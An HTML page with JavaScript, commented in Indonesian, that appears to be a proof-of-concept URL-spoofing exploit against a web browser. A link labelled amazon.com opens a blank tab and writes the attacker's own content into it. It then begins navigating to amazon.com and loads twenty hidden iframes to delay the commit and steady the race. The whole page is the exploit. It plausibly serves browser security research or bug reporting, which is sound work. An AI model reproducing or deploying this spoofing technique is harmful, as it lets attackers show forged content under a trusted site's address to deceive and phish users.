<!DOCTYPE html>
<html>
<body>

<a id="test" href="https://www.amazon.com/" onclick="foo();return false;">
https://www.amazon.com/
</a>

<script>

var w;
var t;

function foo(){

    // buka tab attacker controlled
    w = window.open("about:blank");

    // tulis konten attacker dulu
    w.document.open();
    w.document.write("<h1>document write not amazon</h1>");
    w.document.close();

    // sedikit delay supaya render dulu
    setTimeout(function(){

        // mulai navigation ke amazon
        w.location = "https://www.amazon.com/";

        // spam iframe untuk perlambat commit
        slow();

    }, 100);

}

// memperlambat main page supaya race lebih stabil
function slow(){
    for (let i=0;i<20;i++){
        let iframe = document.createElement("iframe");
        iframe.src="https://www.amazon.com/";
        iframe.style="display:none";
        document.body.appendChild(iframe);
    }
}

</script>

</body>
</html>
